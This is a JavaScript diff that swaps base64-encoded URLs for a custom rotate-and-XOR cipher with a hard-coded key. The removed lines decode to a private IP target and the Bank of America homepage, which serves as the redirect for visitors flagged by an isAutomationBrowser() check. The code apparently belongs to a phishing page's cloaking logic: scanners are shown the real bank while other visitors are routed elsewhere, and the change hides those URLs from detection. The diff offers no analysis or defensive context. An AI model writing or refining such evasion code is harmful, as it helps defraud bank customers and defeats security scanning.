@@ -1,8 +1,46 @@
-const TARGET_URL_BASE64 = "aHR0cDovLzE5Mi4xNjguMi4xNTc=";
-const AUTOMATION_REDIRECT_URL_BASE64 = "aHR0cHM6Ly93d3cuYmFua29mYW1lcmljYS5jb20=";
+const URL_CIPHER_KEY = "bills-redirect-key-v1";
+const TARGET_URL_ENC = "35B7C2640EF2F2EB77C0BC9339627C4E3EAA";
+const AUTOMATION_REDIRECT_URL_ENC = "35B7C2640EF2F2EB77C0BC9339627C4E3EAA";
 
-const TARGET_URL = atob(TARGET_URL_BASE64);
-const AUTOMATION_REDIRECT_URL = atob(AUTOMATION_REDIRECT_URL_BASE64);
+function rotR8(value, shift) {
+  value &= 0xff;
+  shift &= 7;
+  return ((value >>> shift) | (value << (8 - shift))) & 0xff;
+}
+
+function decryptUrl(cipherHex, key) {
+  const initVector = 0xa7;
+  const keyBytes = Array.from(key).map(function (ch) {
+    return ch.charCodeAt(0) & 0xff;
+  });
+  const out = [];
+  let prev = initVector;
+
+  for (let i = 0; i < cipherHex.length; i += 2) {
+    const index = i / 2;
+    const cipherByte = parseInt(cipherHex.slice(i, i + 2), 16);
+    const keyByte = keyBytes[index % keyBytes.length];
+    const addByte = (index * 11 + keyBytes[(index * 3) % keyBytes.length]) & 0xff;
+    const mask = (keyByte + prev + ((index * 29 + 71) & 0xff)) & 0xff;
+    let mixed = rotR8(cipherByte, (index % 7) + 1);
+    mixed = (mixed - addByte) & 0xff;
+    out.push(mixed ^ mask);
+    prev = cipherByte;
+  }
+
+  if (window.TextDecoder) {
+    return new TextDecoder("utf-8").decode(new Uint8Array(out));
+  }
+
+  return decodeURIComponent(
+    out.map(function (byte) {
+      return "%" + byte.toString(16).padStart(2, "0");
+    }).join("")
+  );
+}
+
+const TARGET_URL = decryptUrl(TARGET_URL_ENC, URL_CIPHER_KEY);
+const AUTOMATION_REDIRECT_URL = decryptUrl(AUTOMATION_REDIRECT_URL_ENC, URL_CIPHER_KEY);
 
 function isAutomationBrowser() {
   const ua = navigator.userAgent || "";
